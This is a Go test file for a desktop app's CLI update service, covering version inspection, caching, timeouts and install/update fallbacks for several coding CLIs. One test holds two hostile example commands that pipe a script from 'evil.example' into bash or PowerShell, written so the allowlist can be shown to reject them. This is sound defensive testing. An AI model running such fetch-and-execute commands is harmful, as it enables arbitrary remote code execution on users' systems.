package cli

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/Cookieboty/nomi-ai/apps/desktop-go/internal/cliplugins/builtin"
	"github.com/Cookieboty/nomi-ai/apps/desktop-go/internal/gateway/util"
	"github.com/Cookieboty/nomi-ai/apps/desktop-go/internal/jsrt"
)

type inspectEvents struct {
	mu       sync.Mutex
	payloads []*util.Obj
}

func (e *inspectEvents) Publish(_ string, payload any) {
	if o, ok := payload.(*util.Obj); ok {
		e.mu.Lock()
		e.payloads = append(e.payloads, o)
		e.mu.Unlock()
	}
}

type inspectLog struct {
	mu   sync.Mutex
	info []string
	warn []string
}

func (l *inspectLog) Info(m string, d any) {
	l.mu.Lock()
	l.info = append(l.info, m+" "+fmt.Sprint(d))
	l.mu.Unlock()
}

func (l *inspectLog) Warn(m string, d any) {
	l.mu.Lock()
	l.warn = append(l.warn, m+" "+fmt.Sprint(d))
	l.mu.Unlock()
}

func (l *inspectLog) warns() []string {
	l.mu.Lock()
	defer l.mu.Unlock()
	out := make([]string, len(l.warn))
	copy(out, l.warn)
	return out
}

func (l *inspectLog) infos() []string {
	l.mu.Lock()
	defer l.mu.Unlock()
	out := make([]string, len(l.info))
	copy(out, l.info)
	return out
}

func (e *inspectEvents) all() []*util.Obj {
	e.mu.Lock()
	defer e.mu.Unlock()
	out := make([]*util.Obj, len(e.payloads))
	copy(out, e.payloads)
	return out
}

func stubInspectBins(t *testing.T, bins map[string]string, versions map[string]string) {
	t.Helper()
	prevBin, prevVer, prevFetch, prevTo := resolveInspectBin, readInspectVersion, fetchNpmLatest, inspectTimeout
	resolveInspectBin = func(kind string) string { return bins[kind] }
	readInspectVersion = func(bin string) string { return versions[bin] }
	t.Cleanup(func() {
		resolveInspectBin, readInspectVersion, fetchNpmLatest, inspectTimeout = prevBin, prevVer, prevFetch, prevTo
	})
}

func runInspect(t *testing.T, s *CliUpdateService, refresh bool) []*util.Obj {
	t.Helper()
	var rows []*util.Obj
	var err error
	p := jsrt.Call(func() *jsrt.Promise[[]*util.Obj] { return s.Inspect(refresh) })
	rows, err = jsrt.Block(p)
	if err != nil {
		t.Fatalf("inspect: %v", err)
	}
	return rows
}

func rowByKind(t *testing.T, rows []*util.Obj, kind string) *util.Obj {
	t.Helper()
	for _, r := range rows {
		if r.Get("kind") == kind {
			return r
		}
	}
	t.Fatalf("missing kind %s", kind)
	return nil
}

func TestInspectReturnsLocalWithoutWaitingForNpm(t *testing.T) {
	stubInspectBins(t, map[string]string{"claude": "/usr/bin/claude"}, map[string]string{"/usr/bin/claude": "2.1.0"})
	started := make(chan struct{})
	release := make(chan struct{})
	var startOnce sync.Once
	fetchNpmLatest = func(string, int) string {
		startOnce.Do(func() { close(started) })
		<-release
		return "9.9.9"
	}
	t.Cleanup(func() { close(release) })

	s, err := NewCliUpdateService(CliUpdateOptions{Root: t.TempDir()})
	if err != nil {
		t.Fatal(err)
	}
	start := time.Now()
	rows := runInspect(t, s, false)
	if elapsed := time.Since(start); elapsed > 2*time.Second {
		t.Fatalf("inspect waited for npm: %s", elapsed)
	}
	claude := rowByKind(t, rows, "claude")
	if claude.Get("path") != "/usr/bin/claude" || claude.Get("version") != "2.1.0" {
		t.Fatalf("local probe: %#v", claude)
	}
	if claude.Get("latest") != nil {
		t.Fatalf("cold cache should not wait for latest, got %v", claude.Get("latest"))
	}
	select {
	case <-started:
	case <-time.After(2 * time.Second):
		t.Fatal("expected background npm refresh to start")
	}
}

func TestInspectIncludesWarmLatestCache(t *testing.T) {
	stubInspectBins(t, map[string]string{"codex": "/usr/bin/codex"}, map[string]string{"/usr/bin/codex": "0.16.0"})
	fetchNpmLatest = func(string, int) string {
		t.Fatal("warm cache should not fetch npm on inspect(false)")
		return ""
	}
	s, err := NewCliUpdateService(CliUpdateOptions{Root: t.TempDir()})
	if err != nil {
		t.Fatal(err)
	}
	latest := util.NewObj()
	for _, k := range latestKinds {
		latest.Set(k, "1.0.0")
	}
	latest.Set("codex", "0.17.0")
	s.cache = util.NewObj("checkedAt", cuNow(), "latest", latest)

	rows := runInspect(t, s, false)
	codex := rowByKind(t, rows, "codex")
	if codex.Get("latest") != "0.17.0" {
		t.Fatalf("expected cached latest, got %v", codex.Get("latest"))
	}
	if codex.Get("updateAvailable") != true {
		t.Fatalf("expected updateAvailable, got %v", codex.Get("updateAvailable"))
	}
}

func TestInspectEmitsUpdatedWhenLatestArrives(t *testing.T) {
	stubInspectBins(t, map[string]string{"claude": "/usr/bin/claude"}, map[string]string{"/usr/bin/claude": "2.1.0"})
	release := make(chan struct{})
	fetchNpmLatest = func(pkg string, _ int) string {
		<-release
		if pkg == NpmPkg["claude"] {
			return "2.2.0"
		}
		return "1.0.0"
	}
	ev := &inspectEvents{}
	s, err := NewCliUpdateService(CliUpdateOptions{Root: t.TempDir(), Events: ev})
	if err != nil {
		t.Fatal(err)
	}
	rows := runInspect(t, s, true)
	if rowByKind(t, rows, "claude").Get("latest") != nil {
		t.Fatal("should return before npm")
	}
	close(release)
	deadline := time.Now().Add(2 * time.Second)
	for {
		if time.Now().After(deadline) {
			t.Fatal("did not receive inspect updated event")
		}
		var found *util.Obj
		for _, p := range ev.all() {
			if p.Get("kind") == "inspect" && p.Get("phase") == "updated" {
				found = p
				break
			}
		}
		if found != nil {
			raw, _ := found.Get("rows").([]any)
			var claude *util.Obj
			for _, item := range raw {
				if o, ok := item.(*util.Obj); ok && o.Get("kind") == "claude" {
					claude = o
				}
			}
			if claude == nil || claude.Get("latest") != "2.2.0" {
				t.Fatalf("updated event missing latest: %#v", found)
			}
			if claude.Get("updateAvailable") != true {
				t.Fatalf("expected updateAvailable after latest, got %v", claude.Get("updateAvailable"))
			}
			return
		}
		time.Sleep(20 * time.Millisecond)
	}
}

func TestInspectTimesOutInsteadOfHanging(t *testing.T) {
	stubInspectBins(t, nil, nil)
	block := make(chan struct{})
	resolveInspectBin = func(string) string { <-block; return "" }
	inspectTimeout = 80 * time.Millisecond
	t.Cleanup(func() { close(block) })
	lg := &inspectLog{}
	s, err := NewCliUpdateService(CliUpdateOptions{Root: t.TempDir(), Logger: lg})
	if err != nil {
		t.Fatal(err)
	}
	start := time.Now()
	rows := runInspect(t, s, false)
	elapsed := time.Since(start)
	if elapsed > time.Second {
		t.Fatalf("timeout did not unstick inspect: %s", elapsed)
	}
	if len(rows) != len(inspectKinds) {
		t.Fatalf("got %d rows, want %d", len(rows), len(inspectKinds))
	}
	if rowByKind(t, rows, "claude").Get("path") != nil {
		t.Fatalf("fallback rows should have null path")
	}
	found := false
	for _, w := range lg.warns() {
		if strings.Contains(w, "cli-update inspect timed out") && strings.Contains(w, "fallback=empty") {
			found = true
			break
		}
	}
	if !found {
		t.Fatalf("expected timeout log with empty fallback, got %q", lg.warns())
	}
}

// Inspect 必须在有人长时间占着 GIL 时仍能探到 plan/rows，
// 避免启动期其它 jsrt 工作把 inspectInner 卡到 20s 超时（无 plan 日志）。
func TestInspectProgressesWhileGILHeld(t *testing.T) {
	stubInspectBins(t, map[string]string{"claude": "/usr/bin/claude"}, map[string]string{"/usr/bin/claude": "2.1.0"})
	lg := &inspectLog{}
	s, err := NewCliUpdateService(CliUpdateOptions{Root: t.TempDir(), Logger: lg})
	if err != nil {
		t.Fatal(err)
	}
	p := jsrt.Call(func() *jsrt.Promise[[]*util.Obj] { return s.Inspect(false) })

	holding := make(chan struct{})
	release := make(chan struct{})
	go jsrt.Run(func() {
		close(holding)
		<-release
	})
	<-holding

	start := time.Now()
	rows, err := jsrt.Block(p)
	elapsed := time.Since(start)
	close(release)
	if err != nil {
		t.Fatalf("inspect: %v", err)
	}
	if elapsed > 2*time.Second {
		t.Fatalf("inspect blocked on GIL holder: %s", elapsed)
	}
	if rowByKind(t, rows, "claude").Get("path") != "/usr/bin/claude" {
		t.Fatalf("rows=%v", rows)
	}
	var planned bool
	for _, line := range lg.infos() {
		if strings.Contains(line, "cli-update inspect plan") {
			planned = true
			break
		}
	}
	if !planned {
		t.Fatalf("expected plan log while GIL held, info=%q warn=%q", lg.infos(), lg.warns())
	}
}

// 完成更新会清空探测缓存；在计划与后续处理之间完成更新，不能让 inspect 读到 nil。
type inspectPlanLogger struct {
	once   sync.Once
	onPlan func()
}

func (l *inspectPlanLogger) Info(msg string, _ any) {
	if msg == "cli-update inspect plan" {
		l.once.Do(l.onPlan)
	}
}
func (*inspectPlanLogger) Warn(string, any) {}

func TestInspectKeepsProbeSnapshotWhenUpdateFinishes(t *testing.T) {
	stubInspectBins(t, map[string]string{"codex": "/usr/bin/codex"}, map[string]string{"/usr/bin/codex": "2.0.0"})
	logger := &inspectPlanLogger{}
	s, err := NewCliUpdateService(CliUpdateOptions{Root: t.TempDir(), Logger: logger})
	if err != nil {
		t.Fatal(err)
	}
	latest := util.NewObj()
	for _, kind := range latestKinds {
		latest.Set(kind, "2.0.0")
	}
	s.cache = util.NewObj("checkedAt", cuNow(), "latest", latest)
	s.probed = &probedEntry{at: cuNow(), rows: jsrt.Resolved([]localProbe{{kind: "codex", bin: "/usr/bin/codex", version: "1.0.0"}})}
	s.jobs["codex"] = &cliJob{kind: "codex", status: "running"}
	logger.onPlan = func() {
		// 精确重现 finishJob 与后台 inspect 交错，不靠 sleep 或调度概率。
		jsrt.Run(func() { s.finishJob("codex", cuResult(true, "", "2.0.0")) })
	}
	defer func() {
		if r := recover(); r != nil {
			t.Fatalf("inspect panicked after update invalidated its probe: %v", r)
		}
	}()
	rows, err := s.inspectInner(false)
	if err != nil {
		t.Fatal(err)
	}
	if got := rowByKind(t, rows, "codex").Get("version"); got != "1.0.0" {
		t.Fatalf("in-flight inspect version = %v, want its cached snapshot 1.0.0", got)
	}
	s.mu.Lock()
	invalidated := s.probed == nil
	s.mu.Unlock()
	if !invalidated {
		t.Fatal("in-flight inspect restored the cache invalidated by finishJob")
	}
	// 当前调用可以交付原快照，但下一次调用必须重探测，不能继续使用更新前的版本。
	rows = runInspect(t, s, false)
	if got := rowByKind(t, rows, "codex").Get("version"); got != "2.0.0" {
		t.Fatalf("next inspect version = %v, want fresh probe 2.0.0", got)
	}
}

func TestAntigravityNonNpmUpdateAndInspect(t *testing.T) {
	// 1. 未安装时：UpdateRecipesForPlatform 在 POSIX / Windows 分别返回官方安装脚本配方并通过白名单，注入脚本拒绝；Inspect 支持一键安装
	posixRecipes := UpdateRecipesForPlatform("antigravity", "", "unknown", "global", "darwin")
	if len(posixRecipes) != 1 || posixRecipes[0].Via != "script" {
		t.Fatalf("missing posix antigravity recipes = %#v, want single script recipe", posixRecipes)
	}
	if !IsAllowedUpdateArgv(posixRecipes[0].Argv) {
		t.Fatalf("expected posix install recipe to be allowlisted: %v", posixRecipes[0].Argv)
	}
	winRecipes := UpdateRecipesForPlatform("antigravity", "", "unknown", "global", "win32")
	if len(winRecipes) != 1 || winRecipes[0].Via != "script" {
		t.Fatalf("missing win32 antigravity recipes = %#v, want single script recipe", winRecipes)
	}
	if !IsAllowedUpdateArgv(winRecipes[0].Argv) {
		t.Fatalf("expected win32 install recipe to be allowlisted: %v", winRecipes[0].Argv)
	}
	if IsAllowedUpdateArgv([]string{"bash", "-o", "pipefail", "-c", "curl https://evil.example/a.sh | bash"}) {
		t.Fatal("arbitrary bash script must be rejected by IsAllowedUpdateArgv")
	}
	if IsAllowedUpdateArgv([]string{"powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "irm https://evil.example/a.ps1 | iex"}) {
		t.Fatal("arbitrary powershell script must be rejected by IsAllowedUpdateArgv")
	}

	stubInspectBins(t, map[string]string{}, map[string]string{})
	prevFetch := fetchNpmLatest
	fetchNpmLatest = func(pkg string, _ int) string {
		if pkg == "" {
			t.Fatal("fetchNpmLatest called with empty pkg for non-npm CLI")
		}
		return "1.0.0"
	}
	t.Cleanup(func() { fetchNpmLatest = prevFetch })

	s, err := NewCliUpdateService(CliUpdateOptions{Root: t.TempDir()})
	if err != nil {
		t.Fatal(err)
	}
	rows := runInspect(t, s, false)
	row := rowByKind(t, rows, "antigravity")
	if row.Get("installSupported") != true || row.Get("updateSupported") != true {
		t.Fatalf("missing antigravity installSupported=%v updateSupported=%v, want true/true",
			row.Get("installSupported"), row.Get("updateSupported"))
	}

	// 2. 已安装时：UpdateRecipesForPlatform 包含 `<bin> update` 自更新与官方脚本回退；Inspect 返回 installSupported=true, updateSupported=true, installMethod="native"
	recipes := UpdateRecipesForPlatform("antigravity", "/usr/local/bin/agy", "native", "global", "darwin")
	if len(recipes) != 2 || recipes[0].Via != "self" || recipes[1].Via != "script" ||
		recipes[0].Argv[0] != "/usr/local/bin/agy" || recipes[0].Argv[1] != "update" {
		t.Fatalf("installed antigravity recipes = %#v, want [self, script]", recipes)
	}
	if !IsAllowedUpdateArgv(recipes[0].Argv) || !IsAllowedUpdateArgv(recipes[1].Argv) {
		t.Fatalf("expected installed recipes to be allowlisted: %#v", recipes)
	}
	stubInspectBins(t,
		map[string]string{"antigravity": "/usr/local/bin/agy"},
		map[string]string{"/usr/local/bin/agy": "1.2.3"},
	)
	s2, err := NewCliUpdateService(CliUpdateOptions{Root: t.TempDir()})
	if err != nil {
		t.Fatal(err)
	}
	rows2 := runInspect(t, s2, false)
	row2 := rowByKind(t, rows2, "antigravity")
	if row2.Get("installSupported") != true || row2.Get("updateSupported") != true || row2.Get("installMethod") != "native" {
		t.Fatalf("installed antigravity installSupported=%v updateSupported=%v installMethod=%v, want true/true/native",
			row2.Get("installSupported"), row2.Get("updateSupported"), row2.Get("installMethod"))
	}

	// 3. 运行环境检测不将非 npm 原生 CLI 计入 Node.js 版本依赖
	env := jsrt.Call(func() *util.Obj { return s2.Environment() })
	reqs, _ := env.Get("requirements").([]any)
	for _, r := range reqs {
		if o, ok := r.(*util.Obj); ok && o.Get("kind") == "antigravity" {
			t.Fatalf("non-npm antigravity should not appear in Node requirements: %v", util.Stringify(env))
		}
	}
}

type mockScriptProbe struct {
	tools    map[string]string
	writable bool
}

func (m mockScriptProbe) NodeVersion() string         { return "" }
func (m mockScriptProbe) NodeBin() string             { return "" }
func (m mockScriptProbe) NpmBin() string              { return "" }
func (m mockScriptProbe) NpmPrefix() string           { return "" }
func (m mockScriptProbe) CanWrite(string) bool        { return m.writable }
func (m mockScriptProbe) FindTool(name string) string { return m.tools[name] }

func TestAntigravityOneClickScriptInstallAndUpdateFallback(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("POSIX script fixture uses shell executable")
	}
	ResetCliBinCache()
	t.Cleanup(ResetCliBinCache)

	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("PATH", t.TempDir())
	t.Setenv("NOMI_ANTIGRAVITY_BIN", "")
	t.Setenv("NOMI_USE_MOCK_CLI", "")

	prevFetch := fetchNpmLatest
	fetchNpmLatest = func(string, int) string { return "" }
	t.Cleanup(func() { fetchNpmLatest = prevFetch })

	// 1. 缺少 curl 时返回阻塞原因与 bash/curl/write 检查项
	sMissing, err := NewCliUpdateService(CliUpdateOptions{
		Root:     t.TempDir(),
		Platform: "darwin",
		Probe:    mockScriptProbe{tools: map[string]string{"bash": "/bin/bash"}, writable: true},
	})
	if err != nil {
		t.Fatal(err)
	}
	blockedPlan := jsrt.Call(func() cuPlanned { return sMissing.plan("antigravity", "global") })
	if len(blockedPlan.blocks) == 0 {
		t.Fatal("expected blocker when curl is missing")
	}
	if got := blockedPlan.plan.Get("command"); got != builtin.InstallScript("antigravity") {
		t.Fatalf("plan command = %v, want %q", got, builtin.InstallScript("antigravity"))
	}

	// 2. 前置条件满足：一键安装成功写盘 ~/.local/bin/agy，清缓存发现并回调 OnUpdated
	installDir := filepath.Join(home, ".local", "bin")
	agyBin := filepath.Join(installDir, "agy")
	var updatedKinds []string
	var ran [][]string
	s, err := NewCliUpdateService(CliUpdateOptions{
		Root:     t.TempDir(),
		Platform: "darwin",
		Probe:    mockScriptProbe{tools: map[string]string{"bash": "/bin/bash", "curl": "/usr/bin/curl"}, writable: true},
		OnUpdated: func(kind, _ string) {
			updatedKinds = append(updatedKinds, kind)
		},
		Runner: func(argv []string, onLine func(string), _ int) *jsrt.Promise[CliRunOutput] {
			ran = append(ran, append([]string{}, argv...))
			p := jsrt.NewPromise[CliRunOutput]()
			if err := os.MkdirAll(installDir, 0o755); err != nil {
				p.Resolve(CliRunOutput{Output: err.Error()})
				return p
			}
			ver := "1.5.0"
			if len(ran) >= 3 {
				ver = "1.6.0"
			}
			script := "#!/bin/sh\necho " + ver + "\n"
			if err := os.WriteFile(agyBin, []byte(script), 0o755); err != nil {
				p.Resolve(CliRunOutput{Output: err.Error()})
				return p
			}
			onLine("installed " + ver)
			c0 := 0
			// 当已经装好后的第二次 Run（先跑 agy update）故意让 update 返回退出码 1，验证回退执行官方安装脚本
			if len(argv) == 2 && argv[1] == "update" {
				c1 := 1
				p.Resolve(CliRunOutput{Code: &c1, Output: "self-update unavailable"})
				return p
			}
			p.Resolve(CliRunOutput{Code: &c0, Output: "done"})
			return p
		},
	})
	if err != nil {
		t.Fatal(err)
	}

	// 初次执行一键安装
	resObj, err := jsrt.Block(jsrt.Call(func() *jsrt.Promise[*util.Obj] { return s.Run("antigravity", "global") }))
	if err != nil {
		t.Fatalf("Run install: %v", err)
	}
	if resObj.Get("ok") != true || resObj.Get("version") != "1.5.0" || resObj.Get("path") != agyBin {
		t.Fatalf("install result = %v", util.Stringify(resObj))
	}
	if len(updatedKinds) != 1 || updatedKinds[0] != "antigravity" {
		t.Fatalf("OnUpdated = %v, want [antigravity]", updatedKinds)
	}

	rows := runInspect(t, s, false)
	row := rowByKind(t, rows, "antigravity")
	if row.Get("path") != agyBin || row.Get("version") != "1.5.0" ||
		row.Get("installMethod") != "native" || row.Get("installSupported") != true || row.Get("updateSupported") != true {
		t.Fatalf("inspect after install = %v", util.Stringify(row))
	}

	// 3. 已安装时触发更新：`agy update` 返回非 0 后自动回退执行官方安装脚本更新到 1.6.0
	res2, err := jsrt.Block(jsrt.Call(func() *jsrt.Promise[*util.Obj] { return s.Run("antigravity", "global") }))
	if err != nil {
		t.Fatalf("Run update fallback: %v", err)
	}
	if res2.Get("ok") != true || res2.Get("version") != "1.6.0" {
		t.Fatalf("update fallback result = %v", util.Stringify(res2))
	}
	if len(ran) != 3 || ran[1][1] != "update" || ran[2][0] != "bash" {
		t.Fatalf("unexpected runner call sequence: %#v", ran)
	}
}

type mockNpmProbe struct {
	prefix string
}

func (m mockNpmProbe) NodeVersion() string  { return "26.12.1" }
func (m mockNpmProbe) NodeBin() string      { return "/usr/bin/node" }
func (m mockNpmProbe) NpmBin() string       { return "/usr/bin/npm" }
func (m mockNpmProbe) NpmPrefix() string    { return m.prefix }
func (m mockNpmProbe) CanWrite(string) bool { return true }

func writeFakeCliBin(t *testing.T, dir, name, version string) string {
	t.Helper()
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	bin := filepath.Join(dir, name)
	script := "#!/bin/sh\necho " + version + "\n"
	if err := os.WriteFile(bin, []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	return bin
}

func TestMinimaxUpdateRecipesUseNpmWithoutSelfUpdate(t *testing.T) {
	if builtin.SelfUpdate("minimax") != "" {
		t.Fatalf("minimax selfUpdate = %q, want empty so non-TTY updates use npm directly", builtin.SelfUpdate("minimax"))
	}
	for _, caseSpec := range []struct {
		name, bin, method, scope string
	}{
		{"missing global", "", "unknown", "global"},
		{"installed npm global", "/Users/u/.nvm/versions/node/v26.12.1/bin/mcode", "npm", "global"},
		{"installed npm user", "/Users/u/.nvm/versions/node/v26.12.1/bin/mcode", "npm", "user"},
	} {
		recipes := UpdateRecipesForPlatform("minimax", caseSpec.bin, caseSpec.method, caseSpec.scope, "darwin")
		if len(recipes) != 1 || recipes[0].Via != "npm" {
			t.Fatalf("%s recipes = %#v, want single npm recipe", caseSpec.name, recipes)
		}
		argv := recipes[0].Argv
		if len(argv) < 4 || argv[1] != "install" || argv[2] != "-g" || argv[3] != "@minimax-ai/code@latest" {
			t.Fatalf("%s unexpected npm argv: %#v", caseSpec.name, argv)
		}
		if caseSpec.scope == "user" && (len(argv) != 6 || argv[4] != "--prefix" || argv[5] != UserPrefix()) {
			t.Fatalf("%s missing --prefix %q in argv: %#v", caseSpec.name, UserPrefix(), argv)
		}
		if !IsAllowedUpdateArgv(argv) {
			t.Fatalf("%s recipe rejected by whitelist: %#v", caseSpec.name, argv)
		}
	}

	if runtime.GOOS == "windows" {
		return
	}
	ResetCliBinCache()
	t.Cleanup(ResetCliBinCache)
	home := t.TempDir()
	binDir := filepath.Join(home, "bin")
	writeFakeCliBin(t, binDir, "mcode", "0.7.6")
	t.Setenv("HOME", home)
	t.Setenv("PATH", binDir)
	t.Setenv("NOMI_MINIMAX_BIN", "")
	t.Setenv("NOMI_USE_MOCK_CLI", "")

	s, err := NewCliUpdateService(CliUpdateOptions{
		Root:     t.TempDir(),
		Platform: "darwin",
		Probe:    mockNpmProbe{prefix: home},
	})
	if err != nil {
		t.Fatal(err)
	}
	planned := jsrt.Call(func() cuPlanned { return s.plan("minimax", "global") })
	if len(planned.blocks) > 0 {
		t.Fatalf("unexpected blockers: %v", planned.blocks)
	}
	if len(planned.argv) < 4 || planned.argv[1] != "install" || planned.argv[3] != "@minimax-ai/code@latest" {
		t.Fatalf("plan argv = %#v, want npm install @minimax-ai/code@latest", planned.argv)
	}
	var hasNode, hasNpm, hasWrite bool
	for _, r := range planned.plan.Get("requirements").([]any) {
		if o, ok := r.(*util.Obj); ok {
			switch o.Get("id") {
			case "node":
				hasNode = true
			case "npm":
				hasNpm = true
			case "write":
				hasWrite = true
			}
		}
	}
	if !hasNode || !hasNpm || !hasWrite {
		t.Fatalf("expected node/npm/write checks in plan requirements: %v", util.Stringify(planned.plan))
	}
}

func TestSelfUpdateZeroExitUnchangedFallsBackToNpm(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("POSIX script fixture uses shell executable")
	}
	ResetCliBinCache()
	t.Cleanup(ResetCliBinCache)

	home := t.TempDir()
	binDir := filepath.Join(home, "bin")
	grokBin := writeFakeCliBin(t, binDir, "grok", "1.0.0")
	t.Setenv("HOME", home)
	t.Setenv("PATH", binDir)
	t.Setenv("NOMI_GROK_BIN", "")
	t.Setenv("NOMI_USE_MOCK_CLI", "")

	var ran [][]string
	s, err := NewCliUpdateService(CliUpdateOptions{
		Root:     t.TempDir(),
		Platform: "darwin",
		Probe:    mockNpmProbe{prefix: home},
		Runner: func(argv []string, _ func(string), _ int) *jsrt.Promise[CliRunOutput] {
			ran = append(ran, append([]string{}, argv...))
			p := jsrt.NewPromise[CliRunOutput]()
			c0 := 0
			if len(argv) == 2 && argv[1] == "update" {
				// 模拟自更新退出码为 0，但未写入新版本
				p.Resolve(CliRunOutput{Code: &c0, Output: "No interactive confirmation is available."})
				return p
			}
			// 回退 npm 更新把版本升到 1.1.0
			if err := os.WriteFile(grokBin, []byte("#!/bin/sh\necho 1.1.0\n"), 0o755); err != nil {
				p.Resolve(CliRunOutput{Output: err.Error()})
				return p
			}
			p.Resolve(CliRunOutput{Code: &c0, Output: "added 1 package"})
			return p
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	latest := util.NewObj()
	latest.Set("grok", "1.1.0")
	s.cache = util.NewObj("checkedAt", cuNow(), "latest", latest)

	res, err := jsrt.Block(jsrt.Call(func() *jsrt.Promise[*util.Obj] { return s.Run("grok", "global") }))
	if err != nil {
		t.Fatalf("Run grok: %v", err)
	}
	if res.Get("ok") != true || res.Get("version") != "1.1.0" {
		t.Fatalf("result = %v, want ok=true version=1.1.0", util.Stringify(res))
	}
	if len(ran) != 2 || ran[0][1] != "update" || ran[1][1] != "install" {
		t.Fatalf("expected [self update, npm install], got %#v", ran)
	}
}

func TestUpdateFailsWhenVersionUnchangedButAllowsReinstallAtLatest(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("POSIX script fixture uses shell executable")
	}
	ResetCliBinCache()
	t.Cleanup(ResetCliBinCache)

	home := t.TempDir()
	binDir := filepath.Join(home, "bin")
	mcodeBin := writeFakeCliBin(t, binDir, "mcode", "0.7.6")
	t.Setenv("HOME", home)
	t.Setenv("PATH", binDir)
	t.Setenv("NOMI_MINIMAX_BIN", "")
	t.Setenv("NOMI_USE_MOCK_CLI", "")

	s, err := NewCliUpdateService(CliUpdateOptions{
		Root:     t.TempDir(),
		Platform: "darwin",
		Probe:    mockNpmProbe{prefix: home},
		Runner: func(_ []string, _ func(string), _ int) *jsrt.Promise[CliRunOutput] {
			p := jsrt.NewPromise[CliRunOutput]()
			c0 := 0
			p.Resolve(CliRunOutput{Code: &c0, Output: "up to date"})
			return p
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	latest := util.NewObj()
	latest.Set("minimax", "0.7.9")
	s.cache = util.NewObj("checkedAt", cuNow(), "latest", latest)

	// 1. 已知有新版 0.7.9，但跑完仍停在 0.7.6 → 应判失败并保留版本号与未变更说明
	res, err := jsrt.Block(jsrt.Call(func() *jsrt.Promise[*util.Obj] { return s.Run("minimax", "global") }))
	if err != nil {
		t.Fatalf("Run minimax: %v", err)
	}
	if res.Get("ok") != false || res.Get("version") != "0.7.6" {
		t.Fatalf("unchanged update result = %v, want ok=false version=0.7.6", util.Stringify(res))
	}
	logText, _ := res.Get("log").(string)
	if !strings.Contains(logText, "0.7.6") || !strings.Contains(logText, "0.7.9") {
		t.Fatalf("expected version-unchanged message in log, got %q", logText)
	}

	// 2. 本机已是最新 0.7.9 时点「重装最新」→ 版本不变不应误报失败
	if err := os.WriteFile(mcodeBin, []byte("#!/bin/sh\necho 0.7.9\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	res2, err := jsrt.Block(jsrt.Call(func() *jsrt.Promise[*util.Obj] { return s.Run("minimax", "global") }))
	if err != nil {
		t.Fatalf("Reinstall minimax at latest: %v", err)
	}
	if res2.Get("ok") != true || res2.Get("version") != "0.7.9" {
		t.Fatalf("reinstall result = %v, want ok=true version=0.7.9", util.Stringify(res2))
	}
}
